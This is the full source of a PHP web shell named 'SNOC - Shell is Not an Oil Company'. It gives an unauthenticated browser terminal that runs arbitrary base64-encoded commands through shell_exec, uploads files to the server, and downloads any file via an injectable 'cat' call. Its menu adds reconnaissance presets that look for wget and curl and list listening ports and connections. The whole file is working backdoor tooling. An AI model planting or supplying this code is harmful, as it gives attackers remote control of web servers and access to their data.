<?php 
/**
returns boolean if page opend as shell command
*/
function checkCommand()
{
	return isset($_POST['c']);
	
}

/**
runs command and echos commandresults
*/
function runCommand()
{
	ob_start();
	$out=shell_exec(base64_decode($_POST['c']));
	if(is_null($out))
	{
		$out = ob_getcontents();
	}
	ob_end_clean();
	// HTML Escaping with htmlentities
	echo(base64_encode("<br/>".nl2br(htmlentities($out))));
}

/**
run fileupload
*/
function checkFileUpload()
{
	if(isset($_GET['f']))
	{
		return true;
	}else if(isset($_GET['foo']))
	{
		$target_path =  basename( $_FILES['foo']['name']); 
		if(move_uploaded_file($_FILES['foo']['tmp_name'], $target_path)) {
			echo "The file ".basename($_FILES['foo']['name']). 
			" has been uploaded";
		} else{
			echo "There was an error uploading the file, please try again!";
		}
		return true;
	}
	return false;
}
/**
run filedownload
*/
function checkFileDownload()
{
	if(isset($_GET['d']))
	{
		return true;
	}
	return false;
}

/**
show filedownload
*/
function showFileDownload()
{
	$file = base64_decode($_GET['d']);
	header('Content-type:'.shell_exec('file -i -b '.$file));
	header('Content-Disposition: attachment; filename='.basename($file));
	echo shell_exec('cat '.$file);
}


/**
show fileupload
*/
function showFileUpload()
{
	echo '
	<form enctype="multipart/form-data" action="'.basename(__FILE__).'?foo=1" method="POST" style="font-size:12px;font-family: monospace;">
	Upload to:'.dirname(__FILE__).'<br/><input name="foo" type="file" />
	<input type="submit" value="Do" />
	</form>';
}

/**
echos whole shell as HTML and JS
*/
function echoShell()
{
	echoHead();
	echoJS();
	echoFoot();
}

/**
echos ending HTML part
*/
function echoFoot()
{
	echo '<title>SNOC - Shell is Not an Oil Company</title>
			</head>
			<body style="text-align:center;">
				<div id="shell">
			    	<div id="out"></div>
					<input type="text" name="input" value="" id="command" />
				    <div id="dir"></div>
				    <div id="action">
				    	<select name="action" id="selection">
				    		<option value="0">Weitere Funktionen ...</option>
				    		<option value="3">ping</option>
				    		<option value="2">which downloader</option>
				    		<option value="4">show opened ports</option>
				    		<option value="5">active connections</option>
				    	</select>
				    </div>
				</div>
				<div>
					<iframe src="'.basename(__FILE__).'?f=1" width="600"></iframe>
				</div>
			</body>
		</html>';
}

/**
echos JS part
*/
function echoJS()
{
	echo '<script type="text/javascript" language="javascript">
	// <![CDATA[
	';
	?>
	function Shell(){
		var current_dir = "<?php echo dirname(__FILE__);  ?>";	// current directory
		var history = new Array();				// command history stack
		var history_pos = 0;					// history position
		
		// ------SETUP AUTOCOMPLETION
		// standard commands (in case path cannot be read later on)			
		var knownCommands = ["ls","cd","clear","man","ping","netstat","more","less","diff","rm","mkdir","mv","cp","wc","chmod","cat"];
		var displayAll = false;					// to display all commands when tab is pushed
		var tempFoundCommands = [];				// temporary array to display all matching commands for an input
		var displayed = false;					// true when matching commands have already been displayed
		readPath();						// read commands from path (and add to knownCommands)


		$("#command").focus();					// Focus the command line with cursor
		$("#dir").empty().append(current_dir);			// Display current direcory
		for(var i=0;i<21;i++)					// Look and feel (includes 21 <br>s)
			$("#out").append("<br/>");
		
		printShell('<pre style="margin-left: 170px"> #####  #     # #######  #####<br />'+  
'#     # ##    # #     # #     #<br />'+
'#       # #   # #     # #      <br />'+ 
' #####  #  #  # #     # #       <br />'+
'      # #   # # #     # #       <br />'+
'#     # #    ## #     # #     # <br />'+
' #####  #     # #######  #####  <br />'+                                
'</pre><br />');

		printShell('<span style="margin-left:185px">Shell is Not an Oil Company</span><br /><br /><br /><br />');
			
		// ------ FIRST SYS INFO
		$("#command").val("uname -a")
		runCommand();
		
		// ------ RUN
		function runCommand(){
			var command = $("#command").val().trim();	// reads command
			addToHistory(command);
			
			// special commands
			switch(command) {
				case "clear":
					$("#out").empty();
					$("#command").val("");
					for(var i=0;i<21;i++)
						$("#out").append("<br/>");
				break;
				case "help":
					$("#command").val("");
					printHelp();
				break;
				// TODO: Add new special commands here !
				case "":break;
				// Default command
				default:
					// print out command
					printShell("<br /><span style='color: #46CF4F'>"+current_dir+"></span>&nbsp;"+command);
					
					// empty the command value
					$("#command").val("");
					
					// fullcommand is 
					// 	-> navigate to current dir
					//	-> run command
					//	-> with 2>&1 (pipes stderr for every command)
					//	-> return the new current dir
					var fullcommand = "cd "+current_dir+";"+command+" 2>&1;pwd";
					fullcommand = btoa(fullcommand);	// toBase64
					$.post("shell.php",{"c":fullcommand},function(data){
						if(command.match(/^download/) != null)
						{
							startDownload(command);
							return;
						}
						data = atob(data);	// Base64 decode
						for(var i=data.length-3;i>0;i--) {
							if(data[i] == ">")
								break;
						}
						var output= data.substr(0,i+1);	// substr the output !
						
						// substr the current dir and delete <br/> tag and newline
						current_dir = data.substr(i+1,data.length).replace(/(<([^>]+)>)/ig,"").replace(/\n/g,"");
						printShell(output);
						$("#dir").empty().append(current_dir);	// update the current_dir field
					});
				break;
			}
		}
		

		// ------ HISTORY
		function addToHistory(cmd)
		{
			history.push(cmd);
			history_pos = history.length;
		}
		
		// load previous command with n < 1 and next command with n >= 1
		function loadHistory(n)
		{
			if( n<1 )
			{
				if (history_pos < history.length) {
					$("#command").val(history[history_pos]);
					history_pos++;
					return;
				}
			}
			else
			{
				if (history_pos > 0) {
					$("#command").val(history[history_pos-1]);
					history_pos--;
					return;
				}
			}
			$("#command").val("");		// empty commandarea when end of history reached
		}
		
		// ------ DOWNLOAD FILE
		function startDownload(command)
		{
			file = current_dir+"/"+command.substr(8,command.length).trim();
			window.open("shell.php?d="+btoa(file));
		}
		
		// ------ AUTOCOMPLETION
		// autocomplete input
		function autocomplete()
		{
			var foundCommands = new Array(); // commands that match the input
			var input = $("#command").val();;
			for (c in knownCommands) {
				if (knownCommands[c].substring(0,input.length)===input) { // if command starts with input
					foundCommands.push(knownCommands[c]); // add command
				}
			}
			
			if (foundCommands.length==1) { // iff exactly one command is found
				$("#command").val(foundCommands[0]); // autocomplete
			} else if (foundCommands.length>1) { // alert if more than one match
				var len = foundCommands.length;
				printShell("Display all "+len+" possibilities? (Press TAB)<br />");
				displayAll = true;	// next tab will display all possibilities
				tempFoundCommands = foundCommands;
			}
		}

		// display all matching commands for the input
		function allCommands() {
			for (c in tempFoundCommands) {
				printShell(tempFoundCommands[c]+" ");
			}
			printShell("<br />");
			displayed = true;	// so as to ignore another tab key input
		}

		// read commands from the path and add to known
		function readPath() {
			var pathc = btoa("echo $PATH");				// encode base64
			$.post("shell.php",{"c":pathc},function(data){
				data = atob(data);				// decode
				var pathFolders=data.split(":");		// does this work for every Linux?
				for (p in pathFolders) {			// read commands from every folder
					var lsc = btoa("ls "+pathFolders[p]);	// encode base64
					$.post("shell.php",{"c":lsc},function(cList) {
						cList = atob(cList);		// decode
						var commands = cList.split("<br />");
						for (c in commands) {
							var command = commands[c].trim();
							if (!contains(knownCommands,command)) { // do not add duplicates
								knownCommands.push(command);
							}
						}
					});
				}
			});
		}

		// ------ GENERAL UTILITY FUNCTIONS
		// print function for convenience - appends string to the shell (without newline) and adjusts scrolling
		function printShell(string) {
			$("#out").append(string);
			$("#out").animate({scrollTop: $("#out")[0].scrollHeight});	// scroll to bottom
		}

		// check if an array contains a value
		function contains(array,element) {
			for (i in array) { if (array[i]==element) return true; }
			return false;
		}

		// ------ EVENT HANDLERS		
		$("#command").keyup(function(event){
			switch(event.which)
			{
				//Enter pressed
				case 13:
					runCommand();
				break;
				//Arrow down
				case 38:
					loadHistory(1);
				break;
				//Arrow up
				case 40:
					loadHistory(0);
				break;
			}
			if (event.which!=9) { // unless tab, reset the temporarily found commands
				displayAll = false;
				displayed = false;
				tempFoundCommands = [];
			}
		});

		// tab (autocompletion) - keydown needed (#command loses focus at keyup)
		$("#command").keydown(function(event){
			//Tab key
			if (event.which==9)
			{
				event.preventDefault();	// do not lose focus!
				if (!displayAll) {				
					autocomplete();
				} else if (!displayed) {
					allCommands();
				}
				
				return false;		// some browsers may need that in addition to preventDefault()
			}
		});


		// helpfile
		function printHelp(){
			printShell("<br/><br/><table>"+
			"<tr><th width=150>Functions</th><th>Usage</th></tr>"+
			"<tr><td>download [file]</td><td>download [file] from current directory</td></tr>"+
			"<tr><td>clear</td><td>clear shell prompt</td></tr>"+
			"</table><br/><br/>");
		}
		
		// drop down selection
		$("#selection").click(function(){
		
			switch($(this).val().trim())
			{
				case "2":
					$("#command").val("which wget curl w3m lynx");
					runCommand();
					$(this).val(0)
				break;
				
				case "3":
					var ip = prompt("Which IP/Adress");
					$("#command").val("ping -c 3 "+ip);
					runCommand();
					$(this).val(0)
				break;

				case "4":
					$("#command").val("netstat -an | grep -i listen");
					runCommand();
					$(this).val(0)
				break;
				
				case "5":
					$("#command").val("netstat -a");
					runCommand();
					$(this).val(0)
				break;
				
			}
		});
	}


	// if everything is loaded run :
	$(function(){
		var sh = new Shell();
	});
	
<?php echo '// ]]></script>';
}

/**
echos the headinformation of HTML Content
*/
function echoHead()
{
	echo '<!doctype html>
	<html>  
	<head>
	<style type="text/css" media="screen">
	/*CSS RESETTER*/
	html, body, div, span, applet, object, iframe,
	h1, h2, h3, h4, h5, h6, p, blockquote, pre,
	a, abbr, acronym, address, big, cite, code,
	del, dfn, em, font, img, ins, kbd, q, s, samp,
	small, strike, strong, sub, sup, tt, var,
	dl, dt, dd, ol, ul, li,
	field set, form, label, legend,
	table, caption, tbody, tfoot, thead, tr, th, td { margin:0; padding:0; border:0; outline:0; }
	sub { vertical-align:sub; }
	sup { vertical-align: super; }
	ul, ol { list-style: none; }
	img { border:0 ; }

	body {   
	font-family: monospace;
	}

	#shell{ 
	background-color:#000;
	width:600px;
	margin:0 auto;
	height:400px;
	margin-top:20px;
	position:relative;

	color:#FFF;
	text-align:left;
	}


	#command{
	width:600px;
	border:none;
	background-color: #222;
	padding:0px;
	margin:0px;
	position:absolute;
	padding:3px 0px;
	color:#FFF;
	top:370px;
	left:0px;
	}

	#out{   
	height:340px;
	overflow:auto;
	}

	#dir{   
	position:absolute;
	top:350px;
	left:0px;
	color:#AB1A2D;
	}

	#action{   
	position:absolute;
	top:347px;
	left:410px;
	color:#FFF;
	}
	</style>
	<link rel="shortcut icon" href="data:image/ico;base64,AAABAAEAEBAAAAAAAABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAABoaGiWaGho/2hoaP9oaGj/aGho/2hoaP9oaGj/aGho/2hoaP9oaGj/aGho/2hoaP9oaGj/aGho/2hoaP9oaGiWampq/yYmJv8mJib/JiYm/yYmJv8mJib/JiYm/yYmJv8mJib/JiYm/yYmJv8mJib/JiYm/yYmJv8nJib/ampq/2xsbP8pKSj/KSko/ykoKP8pKSn/KSkp/ykpKf8oKSn/KSkp/ykpKf8pKSn/KSgo/ykoKf8pKCn/KSkp/2xsbP9vb2//LCws/y0sLf8sLCz/LSws/ywsLP8sLC3/LSws/ywtLP8tLCz/LCwt/ywsLP8sLC3/LC0s/ywtLP9vb2//cnJy/zAwMP8wMDD/MDAw/zAwMP8wLzD/MDAw/zAwMP8wMDD/MDAv/zAwL/8wMDD/MDAw/zAwMP8vMDD/cnJy/3R0dP80NDT/NDQ0/zM0NP80NDT/NDQ0/zQzNP80NDT/NDQ0/zM0M/80NDT/NDQ0/zQ0NP80NDT/NDQz/3R0dP93d3f/ODg4/zg4OP84ODj/WaqD/1mqg/9ZqoP/ODg4/zg4OP84ODj/ODk4/zg4OP84ODj/ODg4/zg4OP93d3f/e3t7/zw8PP9ZqoP/PTw8/zw8PP88PDz/PDw8/zw8Pf88PDz/PDw8/z08PP88PDz/PDw8/zw8PP88PDz/e3t7/35+fv9AQD//QEBA/1mqg/9AQED/QEBA/0BAQP9AP0D/QEBA/0BAP/9AQD//QEBA/0BAQP9AQED/P0BA/35+fv+BgYH/Q0ND/1mqg/9DREP/Q0RD/0NDQ/9DQ0P/REND/0NDRP9DQ0P/Q0ND/0NDQ/9DREP/Q0ND/0NDQ/+BgYH/g4OD/0ZGRf9GRkb/RkVG/0ZGRv9GRUb/RkZG/0ZGRv9GRkb/RkZG/0ZGRv9GRkb/RkZF/0ZGRv9GRkb/g4OD/4aGhv/IyMj/yMjJ/8jIyf/IyMj/yMjJ/8jIyP/IyMj/yMjI/8jIyP/IyMj/yMnI/8jIyf/JyMj/yMjI/4aGhv+JiYn/4eHh/93d3f/d3d3/3d3d/93d3f/d3d3/3d3d/93d3f/d3d3/3d3d/93d3f/d3d3/3d3d/+Hh4f+JiYn/i4uLwOXl5f/t7e3/7Ozs/+zs7P/s7Oz/7Ozs/+zs7P/s7Oz/7Ozs/+zs7P/s7Oz/7Ozs/+3t7f/l5eX/i4uLwI2NjVeNjY3AjY2N/42Njf+NjY3/jY2N/42Njf+NjY3/jY2N/42Njf+NjY3/jY2N/42Njf+NjY3/jY2NwI2NjVf///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAQAA//8AAA=="/>
	<script type="text/javascript" language="javascript" charset="utf-8" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>';
}

if(checkCommand())
{
	runCommand();
}
else if(checkFileUpload())
{
	showFileUpload();
}
else if(checkFileDownload())
{
	showFileDownload();
}
else
{
	echoShell();
}
?>
